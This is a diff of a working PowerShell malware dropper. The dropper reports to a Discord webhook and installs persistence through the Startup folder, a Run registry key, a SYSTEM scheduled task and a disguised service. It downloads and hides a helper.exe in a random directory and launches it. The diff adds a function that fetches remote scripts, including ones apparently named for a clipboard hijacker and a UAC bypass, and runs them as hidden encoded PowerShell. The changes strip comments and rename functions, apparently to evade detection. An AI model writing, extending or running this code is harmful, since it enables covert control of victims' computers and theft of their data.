@@ -1,4 +1,4 @@
-$WebhookURL = "https://discord.com/api/webhooks/1437119291957973135/hOH_KcvWcZEZPeG8ALIe5pa9kZTomNQGnoHavlmSEeHrRtuAUMI7xdOQPcG7inVmFMBN"
+$WebhookURL = "https://discord.com/api/webhooks/1437119311226474657/9khwH9RGw0FNIZO1WGgoXHMt3OvZj55JCHSY9RvAabcxbfiUguvjug2nu6l4XC97J5vQ"
 $FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
 $LaunchDelay   = 30
 $WindowStyle   = "Hidden"
@@ -6,7 +6,6 @@ $StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Start
 $StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $TaskName       = "FileExplorerTask"
 $ServiceName    = "FileGuardianService"
-
 function Send-DiscordLog {
     param([string]$Message)
     try {
@@ -15,73 +14,49 @@ function Send-DiscordLog {
         Invoke-WebRequest -Uri $WebhookURL -Method Post -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
     }
     catch {
-        # Silently fail
     }
 }
-
-function Set-Persistence {
+function Set-Survival {
     try {
-        # Copy script to startup if path available
         if (-not (Test-Path $StartupScriptPath)) {
             if ($MyInvocation.MyCommand.Path) {
                 Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
-                $logMsg = "[+] Script copied to startup location: $StartupScriptPath"
+                $logMsg = "[+] Copied to reg $StartupScriptPath"
                 Send-DiscordLog $logMsg
-                Write-Host $logMsg
             } else {
-                $logMsg = "[!] Skipping script copy: Script path not available (likely running interactively). Save as .ps1 and re-run for full persistence."
+                $logMsg = "[!] Skipping reg"
                 Send-DiscordLog $logMsg
-                Write-Host $logMsg
             }
         } else {
-            $logMsg = "[+] Startup script already exists: $StartupScriptPath"
+            $logMsg = "[+] Reg alerdy exists $StartupScriptPath"
             Send-DiscordLog $logMsg
-            Write-Host $logMsg
         }
-
-        # Registry persistence
         $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
         Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force
-        $logMsg = "[+] Registry persistence set."
-        Send-DiscordLog $logMsg
-        Write-Host $logMsg
-
-        # Scheduled Task persistence
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
         $trigger = New-ScheduledTaskTrigger -AtStartup
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
         $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
         Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
-        $logMsg = "[+] Scheduled task persistence set: $TaskName"
+        $logMsg = "[+] Scheduler set $TaskName"
         Send-DiscordLog $logMsg
-        Write-Host $logMsg
-
-        # Service persistence (fixed to run the script)
         $serviceBinPath = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
         if (-not (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue)) {
             New-Service -Name $ServiceName -BinaryPathName $serviceBinPath -StartupType Automatic -Description "File Explorer Service" | Out-Null
             Start-Service -Name $ServiceName
-            $logMsg = "[+] Service persistence created and started: $ServiceName"
+            $logMsg = "[+] Service made and started $ServiceName"
             Send-DiscordLog $logMsg
-            Write-Host $logMsg
         } else {
-            $logMsg = "[+] Service already exists: $ServiceName"
+            $logMsg = "[+] Service already exists $ServiceName"
             Send-DiscordLog $logMsg
-            Write-Host $logMsg
         }
-
-        $logMsg = "[+] All persistence mechanisms established."
-        Send-DiscordLog $logMsg
-        Write-Host $logMsg
     }
     catch {
-        $logMsg = "[!] Failed to set persistence: $($_.Exception.Message)"
+        $logMsg = "[!] Failed to set surival $($_.Exception.Message)"
         Send-DiscordLog $logMsg
-        Write-Host $logMsg
     }
 }
-
 function Run-Payload {
     try {
         $possibleDirectories = @(
@@ -92,11 +67,11 @@ function Run-Payload {
         )
         $selectedDirectory = $possibleDirectories | Get-Random
         if (-not (Test-Path $selectedDirectory)) {
-            throw "Selected directory does not exist: $selectedDirectory"
+            throw "Selected directory does not exist $selectedDirectory"
         }
         $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
         if ($subDirectories.Count -eq 0) {
-            throw "No subdirectories found in the selected directory: $selectedDirectory"
+            throw "No subdirectories found in the selected directory $selectedDirectory"
         }
         $targetSubDirectory = $subDirectories | Get-Random
         $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "helper.exe"
@@ -108,16 +83,40 @@ function Run-Payload {
         }
         Start-Sleep -Seconds $LaunchDelay
         Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle
-        $logMsg = "[+] Payload executed: $TargetPath"
+        $logMsg = "[+] Executed $TargetPath"
         Send-DiscordLog $logMsg
         Write-Host $logMsg
     }
     catch {
-        $logMsg = "[!] Failed to download or launch payload: $($_.Exception.Message)"
+        $logMsg = "[!] Failed to execute $($_.Exception.Message)"
         Send-DiscordLog $logMsg
         Write-Host $logMsg
     }
 }
+function executeps {
+    param([string]$Url)
+    try {
+        $logMsg = "[*] Downloading script from $Url"
+        Send-DiscordLog $logMsg
+        $scriptContent=Invoke-WebRequest -Uri $Url -UseBasicParsing|% Content
+        $logMsg = "[+] Downloaded script from $Url"
+        Send-DiscordLog $logMsg
+        $bytes=[System.Text.Encoding]::Unicode.GetBytes($scriptContent)
+        $encoded=[Convert]::ToBase64String($bytes)
+        $processArgs=@("-WindowStyle","Hidden","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$encoded)
+        Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false
+        $logMsg = "[+] Launched independent execution from $Url"
+        Send-DiscordLog $logMsg
+    }
+    catch {
+        $logMsg = "[!] Failed to execute script from $Url : $($_.Exception.Message)"
+        Send-DiscordLog $logMsg
+    }
+}
 
-Set-Persistence
+Set-Survival
 Run-Payload
+executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/clip")
+executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/depload")
+executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/dreset")
+executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/duac")
